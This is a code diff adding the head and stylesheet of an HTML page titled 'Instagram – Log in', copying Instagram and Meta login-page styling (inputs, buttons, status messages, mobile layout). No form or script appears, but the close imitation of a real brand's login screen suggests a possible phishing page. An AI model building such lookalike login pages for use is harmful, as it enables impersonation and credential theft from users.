@@ -1,2 +1,357 @@
 
 asdad
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram – Log in</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+      background: #fff;
+      color: #1c1e21;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── MAIN LAYOUT ──────────────────────────────────────────── */
+    .page-wrapper {
+      flex: 1;
+      display: flex;
+      flex-direction: row;
+    }
+
+    /* ── LEFT PANEL ───────────────────────────────────────────── */
+    .left-panel {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 48px 48px 48px 64px;
+      border-right: 1px solid #dbdbdb;
+    }
+
+    .left-panel .brand-logo {
+      width: 56px;
+      height: 56px;
+      margin-bottom: 36px;
+    }
+
+    .left-panel .tagline {
+      font-size: 2.25rem;
+      font-weight: 700;
+      line-height: 1.25;
+      color: #1c1e21;
+      max-width: 480px;
+      margin-bottom: 40px;
+    }
+
+    .left-panel .tagline .highlight {
+      background: linear-gradient(90deg, #f9a825 0%, #f26522 40%, #e1306c 80%, #c13584 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .left-panel .hero-image {
+      width: 100%;
+      max-width: 500px;
+      height: auto;
+      display: block;
+    }
+
+    /* ── RIGHT PANEL ──────────────────────────────────────────── */
+    .right-panel {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 48px 40px;
+    }
+
+    .login-box {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .login-heading {
+      font-size: 1.0625rem;
+      font-weight: 700;
+      color: #1c1e21;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dbdbdb;
+      border-radius: 12px;
+      font-size: 0.9375rem;
+      font-family: inherit;
+      color: #1c1e21;
+      background: #fff;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+
+    .form-input::placeholder {
+      color: #9e9e9e;
+    }
+
+    .form-input:focus {
+      border-color: #a0b4c8;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 14px 16px;
+      border: none;
+      border-radius: 50px;
+      background: #0064E0;
+      color: #fff;
+      font-size: 0.9375rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      margin-top: 4px;
+      transition: background 0.15s;
+    }
+
+    .btn-login:hover {
+      background: #0058c7;
+    }
+
+    .forgot-link {
+      text-align: center;
+      margin-top: 16px;
+      margin-bottom: 28px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #1c1e21;
+      text-decoration: none;
+      cursor: pointer;
+      display: block;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .divider-spacer {
+      height: 1px;
+      background: transparent;
+      margin-bottom: 20px;
+    }
+
+    .btn-facebook {
+      width: 100%;
+      padding: 13px 16px;
+      border: 1px solid #dbdbdb;
+      border-radius: 50px;
+      background: #fff;
+      color: #1c1e21;
+      font-size: 0.9375rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      transition: background 0.15s;
+    }
+
+    .btn-facebook:hover {
+      background: #f7f7f7;
+    }
+
+    .fb-icon {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+
+    .btn-create {
+      width: 100%;
+      padding: 13px 16px;
+      border: 1.5px solid #1877f2;
+      border-radius: 50px;
+      background: #fff;
+      color: #1877f2;
+      font-size: 0.9375rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .btn-create:hover {
+      background: #f0f6ff;
+    }
+
+    .meta-branding {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 28px;
+    }
+
+    .status-msg {
+      font-size: 0.875rem;
+      text-align: center;
+      min-height: 20px;
+      margin-bottom: 6px;
+    }
+
+    .status-msg.error  { color: #e0244b; }
+    .status-msg.success { color: #1e7e34; }
+
+    .btn-login.loading {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .meta-logo-img {
+      height: 18px;
+      width: auto;
+    }
+
+    /* ── FOOTER (desktop hidden, mobile visible) ─────────────── */
+    .site-footer {
+      border-top: 1px solid #dbdbdb;
+      padding: 20px 24px;
+      text-align: center;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 6px 14px;
+      margin-bottom: 10px;
+    }
+
+    .footer-links a {
+      font-size: 0.75rem;
+      color: #737373;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-bottom {
+      font-size: 0.75rem;
+      color: #737373;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+    }
+
+    .footer-lang {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      cursor: pointer;
+    }
+
+    .footer-lang svg {
+      width: 10px;
+      height: 10px;
+    }
+
+    /* ── RESPONSIVE – MOBILE ──────────────────────────────────── */
+    @media (max-width: 767px) {
+      .page-wrapper {
+        flex-direction: column;
+      }
+
+      /* hide the left branding panel on mobile */
+      .left-panel {
+        display: none;
+      }
+
+      .right-panel {
+        padding: 0;
+        align-items: stretch;
+        justify-content: flex-start;
+      }
+
+      /* mobile top section: logo + form */
+      .mobile-header {
+        display: flex;
+        justify-content: center;
+        padding: 40px 24px 24px;
+        border-bottom: 1px solid #dbdbdb;
+      }
+
+      .mobile-header .brand-logo {
+        width: 72px;
+        height: 72px;
+      }
+
+      .login-box {
+        max-width: 100%;
+        padding: 28px 24px 32px;
+      }
+
+      .login-heading {
+        font-size: 1rem;
+        margin-bottom: 20px;
+      }
+
+      .form-input {
+        padding: 14px 14px;
+        font-size: 0.9rem;
+      }
+
+      .btn-login {
+        font-size: 0.9rem;
+      }
+
+      .btn-facebook,
+      .btn-create {
+        font-size: 0.9rem;
+      }
+
+      .site-footer {
+        display: block;
+      }
+    }
+
+    /* hide footer on desktop */
+    @media (min-width: 768px) {
+      .mobile-header {
+        display: none;
+      }
+
+      .site-footer {
+        display: none;
+      }
+    }
+  </style>
+</head>
